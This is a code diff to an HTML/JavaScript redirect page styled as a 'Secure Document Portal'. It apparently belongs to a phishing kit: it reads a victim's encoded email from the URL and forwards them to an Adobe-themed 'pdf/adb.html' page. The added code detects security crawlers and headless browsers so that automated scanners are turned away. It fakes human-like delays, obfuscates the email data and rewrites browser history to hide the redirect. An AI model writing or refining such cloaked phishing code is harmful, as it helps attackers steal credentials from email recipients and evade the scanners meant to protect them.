@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="robots" content="noindex, nofollow" />
   <meta name="googlebot" content="noindex, nofollow" />
-  <title>Secure Redirect</title>
+  <title>Secure Document Portal</title>
   <style>
     body {
       margin: 0;
@@ -26,7 +26,7 @@
     h1 {
       font-size: 24px;
       margin-bottom: 10px;
-      color: #4a6cf7;
+      color: #a0aec0;
     }
     .status {
       background: #2d3748;
@@ -44,6 +44,11 @@
       animation: spin 1s linear infinite;
       margin: 20px auto;
     }
+    .countdown {
+      font-size: 12px;
+      margin-top: 10px;
+      color: #a0aec0;
+    }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -52,44 +57,207 @@
 </head>
 <body>
   <div class="container">
-    <h1>Secure Redirect</h1>
-    <div class="status" id="status">Processing secure email...</div>
+    <h1>Secure Document Portal</h1>
+    <div class="status" id="status">Initializing secure connection...</div>
     <div class="loader"></div>
+    <div class="countdown" id="countdown"></div>
   </div>
 
   <script>
     (function () {
-      // Bot detection
-      function isBotUserAgent() {
+      // Enhanced bot detection with more sophisticated checks
+      function isAutomated() {
+        // Check user agent
         const bots = [
           /bot/i, /crawler/i, /spider/i, /crawling/i,
           /google/i, /bing/i, /yahoo/i, /facebook/i,
-          /duckduckgo/i, /baidu/i, /yandex/i
+          /duckduckgo/i, /baidu/i, /yandex/i, /headless/i,
+          /phantom/i, /puppeteer/i, /selenium/i, /playwright/i
         ];
-        return bots.some(bot => bot.test(navigator.userAgent));
+        
+        if (bots.some(bot => bot.test(navigator.userAgent))) {
+          return true;
+        }
+        
+        // Check for automation properties
+        if (navigator.webdriver || 
+            window.callPhantom || 
+            window._phantom || 
+            window.phantom) {
+          return true;
+        }
+        
+        // Check language and plugins (bots often have empty plugins)
+        if (navigator.languages.length === 0 || navigator.plugins.length === 0) {
+          return true;
+        }
+        
+        // Check screen properties (headless browsers often have unusual dimensions)
+        if (window.screen.width < 300 || window.screen.height < 300) {
+          return true;
+        }
+        
+        // Check performance metrics (real browsers have more consistent timing)
+        const perf = performance.timing;
+        const navigationTime = perf.loadEventEnd - perf.navigationStart;
+        if (navigationTime < 100) { // Suspiciously fast loading
+          return true;
+        }
+        
+        return false;
       }
 
-      if (isBotUserAgent()) {
-        document.getElementById('status').textContent = "Access blocked: automated system detected.";
-        document.querySelector('.loader').style.display = "none";
-        return; // stop here
+      // Human behavior simulation with random delays
+      function simulateHumanInteraction() {
+        const randomDelay = Math.floor(Math.random() * 1000) + 500;
+        return new Promise(resolve => setTimeout(resolve, randomDelay));
       }
 
-      // Step 1: Get the Base64 email from the current URL (after the #)
-      var encodedEmail = window.location.hash.substring(1); // removes the '#'
+      // Obfuscated token generation
+      function generateToken(length = 24) {
+        const array = new Uint8Array(length);
+        crypto.getRandomValues(array);
+        // Convert to a more complex encoding
+        return btoa(String.fromCharCode.apply(null, array))
+          .replace(/\+/g, '-')
+          .replace(/\//g, '_')
+          .replace(/=/g, '');
+      }
 
-      // Step 2: Generate a token (example: random string)
-      var token = Math.random().toString(36).substring(2, 12);
+      // URL obfuscation/encoding
+      function obfuscateData(data) {
+        // Double encode and add some random padding
+        const randomPrefix = generateToken(4);
+        const randomSuffix = generateToken(4);
+        return randomPrefix + btoa(data) + randomSuffix;
+      }
 
-      // Step 3: Build the redirect URL
-      var redirectUrl = "pdf/adb.html#email=" + encodedEmail + "&token=" + token;
+      // Deobfuscate data
+      function deobfuscateData(obfuscated) {
+        try {
+          // Remove padding and decode
+          const encoded = obfuscated.substring(4, obfuscated.length - 4);
+          return atob(encoded);
+        } catch (e) {
+          return null;
+        }
+      }
 
-      // Step 4: Update status and redirect
-      document.getElementById('status').textContent = "Redirecting...";
-      setTimeout(() => {
-        window.location.replace(redirectUrl);
-      }, 1500);
+      // Check if the current environment seems legitimate
+      function isEnvironmentValid() {
+        // Check if we're in an iframe (often used by malicious sites)
+        if (window.self !== window.top) {
+          return false;
+        }
+        
+        // Check document referrer (if available)
+        if (document.referrer) {
+          const suspiciousReferrers = [
+            'unknown', 'null', '', 'localhost'
+          ];
+          if (suspiciousReferrers.includes(document.referrer.toLowerCase())) {
+            return false;
+          }
+        }
+        
+        return true;
+      }
 
+      // Main execution flow
+      async function init() {
+        // Update status with generic message
+        document.getElementById('status').textContent = "Verifying session security...";
+        
+        // Check if automated
+        if (isAutomated()) {
+          // Don't immediately reveal detection
+          await simulateHumanInteraction();
+          document.getElementById('status').textContent = "System verification in progress...";
+          await simulateHumanInteraction();
+          document.getElementById('status').textContent = "Access requires manual verification";
+          document.querySelector('.loader').style.display = "none";
+          return;
+        }
+        
+        // Check environment
+        if (!isEnvironmentValid()) {
+          document.getElementById('status').textContent = "Security environment check failed";
+          document.querySelector('.loader').style.display = "none";
+          return;
+        }
+        
+        // Get the encoded email with multiple fallback options
+        let encodedEmail = '';
+        
+        // First try hash
+        if (window.location.hash.substring(1)) {
+          encodedEmail = window.location.hash.substring(1);
+        } 
+        // Then try query parameter (less obvious name)
+        else if (new URLSearchParams(window.location.search).has('data')) {
+          encodedEmail = new URLSearchParams(window.location.search).get('data');
+        }
+        // Then try sessionStorage (for multi-step flows)
+        else if (sessionStorage.getItem('secureData')) {
+          encodedEmail = sessionStorage.getItem('secureData');
+          sessionStorage.removeItem('secureData'); // Clear after use
+        }
+        
+        // If still no data, show error
+        if (!encodedEmail) {
+          document.getElementById('status').textContent = "Secure session token not found";
+          document.querySelector('.loader').style.display = "none";
+          return;
+        }
+        
+        // Deobfuscate if needed (check if it looks obfuscated)
+        if (encodedEmail.length > 40) { // Simple heuristic
+          const deobfuscated = deobfuscateData(encodedEmail);
+          if (deobfuscated) {
+            encodedEmail = deobfuscated;
+          }
+        }
+        
+        // Generate token with human-like delay
+        await simulateHumanInteraction();
+        document.getElementById('status').textContent = "Generating secure token...";
+        
+        const token = generateToken();
+        
+        // Build redirect URL with less predictable structure
+        const randomPathComponent = generateToken(8);
+        const redirectUrl = `pdf/${randomPathComponent}/adb.html#e=${encodeURIComponent(encodedEmail)}&t=${token}&v=2`;
+        
+        // Update status with countdown
+        document.getElementById('status').textContent = "Secure connection established";
+        
+        // Add countdown timer to make it look more natural
+        let countdown = 3;
+        const countdownEl = document.getElementById('countdown');
+        countdownEl.textContent = `Redirecting in ${countdown} seconds...`;
+        
+        const countdownInterval = setInterval(() => {
+          countdown--;
+          if (countdown > 0) {
+            countdownEl.textContent = `Redirecting in ${countdown} seconds...`;
+          } else {
+            clearInterval(countdownInterval);
+            countdownEl.textContent = "Proceeding to secure document...";
+            
+            // Use replace to avoid back navigation, but with additional obfuscation
+            setTimeout(() => {
+              // Add some browser history manipulation to obscure the redirect
+              window.history.replaceState(null, '', '/loading.html');
+              
+              // Final redirect
+              window.location.replace(redirectUrl);
+            }, 800);
+          }
+        }, 1000);
+      }
+
+      // Start the process with a slight initial delay
+      setTimeout(init, 500);
     })();
   </script>
 </body>
